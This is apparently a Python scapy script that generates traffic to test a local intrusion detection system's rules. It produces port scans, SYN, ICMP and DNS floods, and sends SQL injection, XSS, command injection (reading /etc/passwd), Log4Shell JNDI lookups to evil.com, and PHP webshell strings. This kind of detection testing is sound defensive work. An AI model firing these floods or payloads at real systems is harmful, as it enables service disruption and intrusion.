#!/usr/bin/env python3
"""
generate_nids_alerts.py
Generate traffic patterns to trigger NIDS rate-based and YARA detection rules.

Usage:
    python generate_nids_alerts.py --mode all --target 127.0.0.1
    python generate_nids_alerts.py --mode random --target 127.0.0.1
    python generate_nids_alerts.py --mode yara --target 127.0.0.1
    python generate_nids_alerts.py --continuous --interval 30

Modes:
    portscan      - Triggers RATE-001 (Port Scan) - HIGH
    bruteforce    - Triggers RATE-002 (Brute Force) - HIGH
    synflood     - Triggers RATE-003 (SYN Flood) - CRITICAL
    icmpflood    - Triggers RATE-004 (ICMP Flood) - MEDIUM
    dnsflood     - Triggers RATE-006 (DNS Flood) - MEDIUM
    sql_injection - Triggers WEB-001 (SQL Injection) - HIGH (YARA)
    xss          - Triggers WEB-003 (XSS Attack) - MEDIUM (YARA)
    cmd_injection - Triggers WEB-005 (Command Injection) - CRITICAL (YARA)
    log4shell    - Triggers CVE-2021-44228 (Log4Shell) - CRITICAL (YARA)
    yara         - All YARA-triggering attacks
    web          - Web attacks only (SQLi, XSS, CMD)
    dos          - DoS attacks only (SYN, ICMP, DNS flood)
    random       - Randomly select attacks for varied severities
    all          - All attacks
"""

import argparse
import random
import time
from scapy.all import IP, TCP, ICMP, UDP, send, Raw


# ==================== RATE-BASED ATTACKS ====================


def port_scan(target_ip: str, count: int = 30, delay: float = 0.02):
    """Triggers RATE-001 (Port Scan) - unique dst ports from single source (HIGH)"""
    for port in range(1, count + 1):
        pkt = IP(dst=target_ip) / TCP(
            sport=random.randint(1024, 65535), dport=port, flags="S"
        )
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f"[OK] Port Scan packets sent: {count} (Triggers RATE-001 - HIGH)")


def brute_force(target_ip: str, port: int = 22, count: int = 20):
    """Triggers RATE-002 (Brute Force) - multiple auth attempts (HIGH)"""
    for _ in range(count):
        pkt = IP(dst=target_ip) / TCP(
            sport=random.randint(1024, 65535), dport=port, flags="S"
        )
        send(pkt, verbose=False)
        time.sleep(0.1)
    print(
        f"[OK] Brute Force packets sent: {count} -> {target_ip}:{port} (Triggers RATE-002 - HIGH)"
    )


def syn_flood(target_ip: str, target_port: int = 80, count: int = 260):
    """Triggers RATE-003 (SYN Flood) - high rate of SYN packets (CRITICAL)"""
    for _ in range(count):
        pkt = IP(dst=target_ip) / TCP(
            sport=random.randint(1024, 65535), dport=target_port, flags="S"
        )
        send(pkt, verbose=False)
    print(
        f"[OK] SYN Flood packets sent: {count} -> {target_ip}:{target_port} (Triggers RATE-003 - CRITICAL)"
    )


def icmp_flood(target_ip: str, count: int = 140):
    """Triggers RATE-004 (ICMP Flood) - high rate of ICMP packets (MEDIUM)"""
    for _ in range(count):
        pkt = IP(dst=target_ip) / ICMP()
        send(pkt, verbose=False)
    print(f"[OK] ICMP Flood packets sent: {count} (Triggers RATE-004 - MEDIUM)")


def dns_flood(target_ip: str, count: int = 80):
    """Triggers RATE-006 (DNS Flood) - high rate of DNS queries (MEDIUM)"""
    for _ in range(count):
        pkt = IP(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=53)
        send(pkt, verbose=False)
    print(f"[OK] DNS Flood packets sent: {count} (Triggers RATE-006 - MEDIUM)")


# ==================== YARA-TRIGGERING ATTACKS ====================


def sql_injection(target_ip: str, count: int = 5):
    """Triggers WEB-001 (SQL Injection) via HTTP-like payload (HIGH - YARA)"""
    payloads = [
        "' OR '1'='1",
        "UNION SELECT NULL--",
        "admin'--",
        "' DROP TABLE users--",
    ]
    for _ in range(count):
        for p in payloads:
            payload = f"GET /login?user={p} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            pkt = (
                IP(dst=target_ip)
                / TCP(sport=random.randint(1024, 65535), dport=80, flags="PA")
                / Raw(load=payload)
            )
            send(pkt, verbose=False)
        time.sleep(0.3)
    print(f"[OK] SQL Injection packets sent (Triggers WEB-001 - HIGH)")


def xss_attack(target_ip: str, count: int = 5):
    """Triggers WEB-003 (XSS Attack) via HTTP-like payload (MEDIUM - YARA)"""
    payloads = [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "onmouseover=alert(1)",
    ]
    for _ in range(count):
        for p in payloads:
            payload = f"GET /search?q={p} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            pkt = (
                IP(dst=target_ip)
                / TCP(sport=random.randint(1024, 65535), dport=80, flags="PA")
                / Raw(load=payload)
            )
            send(pkt, verbose=False)
        time.sleep(0.3)
    print(f"[OK] XSS Attack packets sent (Triggers WEB-003 - MEDIUM)")


def cmd_injection(target_ip: str, count: int = 5):
    """Triggers WEB-005 (Command Injection) via HTTP-like payload (CRITICAL - YARA)"""
    payloads = [
        "; cat /etc/passwd",
        "| ls -la",
        "`id`",
        "$(whoami)",
    ]
    for _ in range(count):
        for p in payloads:
            payload = f"GET /exec?cmd={p} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            pkt = (
                IP(dst=target_ip)
                / TCP(sport=random.randint(1024, 65535), dport=80, flags="PA")
                / Raw(load=payload)
            )
            send(pkt, verbose=False)
        time.sleep(0.3)
    print(f"[OK] Command Injection packets sent (Triggers WEB-005 - CRITICAL)")


def log4shell(target_ip: str, count: int = 3):
    """Triggers CVE-2021-44228 (Log4Shell) via HTTP-like payload (CRITICAL - YARA)"""
    payloads = [
        "${jndi:ldap://evil.com/a}",
        "${${lower:j}ndi:ldap://evil.com/a}",
        "${${::-j}${::-n}${::-d}i:ldap://evil.com}",
    ]
    for _ in range(count):
        for p in payloads:
            payload = f"GET /api?data={p} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            pkt = (
                IP(dst=target_ip)
                / TCP(sport=random.randint(1024, 65535), dport=8080, flags="PA")
                / Raw(load=payload)
            )
            send(pkt, verbose=False)
        time.sleep(0.3)
    print(f"[OK] Log4Shell packets sent (Triggers CVE-2021-44228 - CRITICAL)")


def webshell(target_ip: str, count: int = 3):
    """Triggers MAL-003 (PHP Webshell) via HTTP-like payload (CRITICAL - YARA)"""
    payloads = [
        "eval(base64_decode(",
        "system($_GET",
        "passthru($_POST",
        "shell_exec($_REQUEST",
    ]
    for _ in range(count):
        for p in payloads:
            payload = f"POST /upload HTTP/1.1\r\nHost: {target_ip}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n={p} HTTP/1.1\r\n\r\n"
            pkt = (
                IP(dst=target_ip)
                / TCP(sport=random.randint(1024, 65535), dport=80, flags="PA")
                / Raw(load=payload)
            )
            send(pkt, verbose=False)
        time.sleep(0.3)
    print(f"[OK] Webshell packets sent (Triggers MAL-003 - CRITICAL)")


# ==================== MIXED MODE ====================


def run_random_mode(target_ip: str):
    """Randomly select attacks to generate varied severity alerts"""
    attacks = [
        ("Port Scan", lambda: port_scan(target_ip, count=25), "HIGH", "RATE-001"),
        (
            "Brute Force",
            lambda: brute_force(target_ip, port=22, count=18),
            "HIGH",
            "RATE-002",
        ),
        ("SYN Flood", lambda: syn_flood(target_ip, count=250), "CRITICAL", "RATE-003"),
        ("ICMP Flood", lambda: icmp_flood(target_ip, count=120), "MEDIUM", "RATE-004"),
        ("DNS Flood", lambda: dns_flood(target_ip, count=70), "MEDIUM", "RATE-006"),
        ("SQL Injection", lambda: sql_injection(target_ip, count=3), "HIGH", "WEB-001"),
        ("XSS Attack", lambda: xss_attack(target_ip, count=3), "MEDIUM", "WEB-003"),
        (
            "Command Injection",
            lambda: cmd_injection(target_ip, count=3),
            "CRITICAL",
            "WEB-005",
        ),
        (
            "Log4Shell",
            lambda: log4shell(target_ip, count=2),
            "CRITICAL",
            "CVE-2021-44228",
        ),
        ("Webshell", lambda: webshell(target_ip, count=2), "CRITICAL", "MAL-003"),
    ]

    # Randomly select 3-5 attacks
    num_attacks = random.randint(3, 5)
    selected = random.sample(attacks, num_attacks)

    print(f"\n[*] Randomly selected {num_attacks} attacks:")
    for name, _, severity, rule in selected:
        print(f"    - {name} ({severity}) -> {rule}")
    print()

    for name, func, severity, rule in selected:
        print(f"[*] Running {name} ({severity})...")
        func()
        time.sleep(1)


# ==================== MAIN ====================


def main():
    parser = argparse.ArgumentParser(
        description="Generate traffic to trigger local NIDS alerts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--target", default="127.0.0.1", help="Target IP (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--mode",
        choices=[
            "portscan",
            "bruteforce",
            "synflood",
            "icmpflood",
            "dnsflood",
            "sql_injection",
            "xss",
            "cmd_injection",
            "log4shell",
            "webshell",
            "yara",
            "web",
            "dos",
            "random",
            "all",
        ],
        default="all",
        help="Traffic mode",
    )
    parser.add_argument(
        "--port", type=int, default=80, help="Target port for synflood/bruteforce"
    )
    parser.add_argument(
        "--continuous", "-c", action="store_true", help="Run continuously in a loop"
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=30,
        help="Seconds between attack rounds (default: 30)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=0,
        help="Number of attack rounds (0 = infinite, default: 0)",
    )
    args = parser.parse_args()

    print(f"[*] NIDS Alert Generator")
    print(f"[*] Target: {args.target}")
    print(f"[*] Mode: {args.mode}")
    if args.continuous:
        print(f"[*] Continuous mode: ON (interval: {args.interval}s)")

    rounds = 0

    while True:
        rounds += 1
        print(f"\n{'=' * 50}")
        print(f"[*] Round {rounds}")
        print(f"{'=' * 50}")

        if args.mode == "random":
            run_random_mode(args.target)

        elif args.mode == "all":
            # Rate-based attacks
            print("[*] Running Rate-based attacks...")
            port_scan(args.target, count=30)
            time.sleep(0.5)
            brute_force(args.target, port=22, count=20)
            time.sleep(0.5)
            syn_flood(args.target, args.port, count=260)
            time.sleep(0.5)
            icmp_flood(args.target, count=140)
            time.sleep(0.5)
            dns_flood(args.target, count=80)
            time.sleep(0.5)
            # YARA attacks
            print("[*] Running YARA-triggering attacks...")
            sql_injection(args.target, count=3)
            time.sleep(0.5)
            xss_attack(args.target, count=3)
            time.sleep(0.5)
            cmd_injection(args.target, count=3)
            time.sleep(0.5)
            log4shell(args.target, count=2)
            time.sleep(0.5)
            webshell(args.target, count=2)

        elif args.mode == "yara":
            sql_injection(args.target, count=5)
            time.sleep(0.5)
            xss_attack(args.target, count=5)
            time.sleep(0.5)
            cmd_injection(args.target, count=5)
            time.sleep(0.5)
            log4shell(args.target, count=3)
            time.sleep(0.5)
            webshell(args.target, count=3)

        elif args.mode == "web":
            sql_injection(args.target, count=5)
            time.sleep(0.5)
            xss_attack(args.target, count=5)
            time.sleep(0.5)
            cmd_injection(args.target, count=5)

        elif args.mode == "dos":
            syn_flood(args.target, args.port, count=300)
            time.sleep(0.5)
            icmp_flood(target_ip=args.target, count=150)
            time.sleep(0.5)
            dns_flood(args.target, count=100)

        elif args.mode == "portscan":
            port_scan(args.target, count=30)
        elif args.mode == "bruteforce":
            brute_force(args.target, port=22, count=20)
        elif args.mode == "synflood":
            syn_flood(args.target, args.port, count=260)
        elif args.mode == "icmpflood":
            icmp_flood(args.target, count=140)
        elif args.mode == "dnsflood":
            dns_flood(args.target, count=80)
        elif args.mode == "sql_injection":
            sql_injection(args.target, count=5)
        elif args.mode == "xss":
            xss_attack(args.target, count=5)
        elif args.mode == "cmd_injection":
            cmd_injection(args.target, count=5)
        elif args.mode == "log4shell":
            log4shell(args.target, count=3)
        elif args.mode == "webshell":
            webshell(args.target, count=3)

        print("\n[DONE] Traffic generation completed.")

        # Check if we should stop
        if args.continuous:
            if args.count > 0 and rounds >= args.count:
                print(f"[*] Completed {rounds} rounds as requested.")
                break
            print(f"[*] Waiting {args.interval}s before next round...")
            time.sleep(args.interval)
        else:
            break

    print("\n" + "=" * 50)
    print("[*] Check alerts with: curl http://localhost:8000/api/v1/alerts?limit=20")
    print("[*] Check stats with: curl http://localhost:8000/api/v1/stats")
    print("=" * 50)


if __name__ == "__main__":
    main()
